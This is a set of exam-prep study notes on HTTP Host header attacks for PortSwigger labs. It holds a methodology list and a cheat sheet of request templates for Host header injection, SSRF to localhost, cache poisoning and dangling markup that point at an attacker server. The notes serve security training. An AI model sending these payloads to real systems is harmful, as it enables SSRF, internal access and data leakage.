## Key Terms

```bash
- Param Miner extension
	  -> guess: headers, params, body, everything!
```

## Most important labs

- [Host-header-injection-via-web-cache-poisoning+xss](host-header-injection-via-web-cache-poisoning+xss.md)

- [SSRF via arbitraty host + EXTRA lab: absolute path](SSRF-via-arbitraryhost-and-absolute-path.md)

- [SSRF-via-host-validation-bypass-via-connection-state-attack](SSRF-via-host-validation-bypass-via-connection-state-attack.md)


## Metodology

❗ Important: To avoid wasting time during the exam, PortSwigger warns that if an SSRF exists it will always be reachable at **localhost** on **port 6566**. 

```bash
- Discover allowed headers with Param Miner
- Try Arbitrary Host
- Only local users? 
	  -> localhost
	  -> SSRF 
- Inject duplicate host header -> blocked? -> indent.
- Intruder -> !! disable update host to match !! 
- Try absloute path in GET = ignore malicious host 
- Send 2 request in a single connection -> 1 valid + 2 with SSRF
- Try inject in port after port delimeter : delimeter  
```

## Cheat Sheet

```bash
# ARBITRARY HOST / TRY FIRST INSERT COLLABORATOR PAYLOAD 
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
# DUPLICATE HOST / SWITCH ORDER
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
Host: <OUR-SV>||<LOCALHOST-SSRF>
# MALICIOUS INDENTED <TAB> (TRY MORE TABS) HOST + LEGIT HOST
GET /example HTTP/1.1
	Host: <OUR-SV>||<LOCALHOST-SSRF>         
Host: <VULNERABLE-WEB>
# TRY OTHER HEADERS -> X-Host, X-Forwarded-Server, X-HTTP-Host-Override ... etc
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
X-Forwarded-Host: <OUR-SV>||<LOCALHOST-SSRF>
# ABSOLUTE PATH = IGNORE HOST 
GET <ABSOLUTE_PATH>            
Host: <OUR-SV>||<LOCALHOST-SSRF>
# MULTIPLE REQUEST IN A SINGLE CONNECTION
## REQUEST 1
GET /
Host: <VALID-HOST>
Connection: keep-alive
## REQUEST 2
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>|
Connection: keep-alive
# AFTER PORT : DELIMETER - DANGLING MARKUP
GET /
Host: <YOUR-LAB>:'<a href="//<EXPLOIT-SV>/?
```
